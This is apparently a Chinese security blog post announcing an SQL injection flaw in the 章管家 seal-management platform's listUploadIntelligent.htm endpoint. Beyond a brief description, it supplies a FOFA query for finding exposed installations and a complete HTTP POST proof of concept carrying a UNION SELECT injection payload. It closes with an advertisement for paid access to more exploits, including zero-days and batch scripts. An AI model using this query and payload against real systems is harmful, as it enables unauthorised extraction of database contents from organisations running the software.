#  漏洞推送|章管家listUploadIntelligent.htm存在SQL注入漏洞   
 小白菜安全   2024-11-08 23:37  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
漏洞描述  
  
  
章管家是上海建业信息科技股份有限公司推出的一款针对传统印章风险管理提供的整套解决方案的工具。其系统低版本listUploadIntelligent.htm存在sql注入漏洞，攻击者可通过该漏洞获取数据库敏感信息，请及时联系厂商修复。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
资产信息  
  
  
fofa:app="章管家-印章智慧管理平台"  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia3tTGtP5aodpZlaIghwuZSgchBYTjhkqsibPG9YEbKcDjVMW7OF59z3lUczE0vqmf9zVibXcm3b5zIQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
漏洞复现  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia3tTGtP5aodpZlaIghwuZSgLe810icRfCJ2JqJtjlXBkmTE73BicMpSdXiaVJoicMCiboCdBuT32O7GOeg/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
POC  
  
```
POST /app/message/listUploadIntelligent.htm HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Content-Length: 112
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate, br

token=dingtalk_token&person_id=1&unit_id=1&pageNo=1&is_read=-1 union select MD5(123),2,3,4,5,6,7,8,9,10,11,12 --
```  
  
---------------------------------------------------  
  
更多漏洞poc（包括0day漏洞）、安全工具、批量脚本加入内部圈子获取，目前只要49，无理由3天退款，加入圈子请扫描下方二维码。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/NhLcT1kxlia2ibXzzibVk15gaIwPj3Libib3wz7rEzD4jThibDB3puG8zRTD9fLx4Ndhglm3VOUhNiczqNuriccyD38ibQw/640?wx_fmt=jpeg "")  
  
  
  
漏洞文库：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia2ibXzzibVk15gaIwPj3Libib3wh2bIueGiaicJL46kobAMKQCktI8HFTcVM9JpwNibdMKD9ZND0ebC0rwnw/640?wx_fmt=png&from=appmsg "")  
  
  
工具收集：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia2ibXzzibVk15gaIwPj3Libib3w26uxWScqm4lh60gQawZjffnNamZQR8BylhRBdjtf15dWgFsHMwrsFQ/640?wx_fmt=png&from=appmsg "")  
  
  
脚本文库：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia2ibXzzibVk15gaIwPj3Libib3wsdaXl2dhDDAJN3ZDl5fYWnGIckTK1vgLVHq2SHDDicic8OkMmMJ1fluw/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgOaSVwdVAPT7DWSKK7pjSWGdbQKWEM0yTB3JSqNxLUnEBesOW8eG40w/640?wx_fmt=png&from=appmsg "")  
  
免责声明  
  
  
该公众号主要是分享互联网上公开的一些漏洞poc和工具，  
利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，本公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如果本公众号分享导致的侵权行为请告知，我们会立即删除并道歉。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgAth2WTu4kyEzL1Dia7AXUWcP7tsbHDtpaH1cls1lJTPVNE6XTwLYvJg/640?wx_fmt=gif&from=appmsg "")  
  
  
  
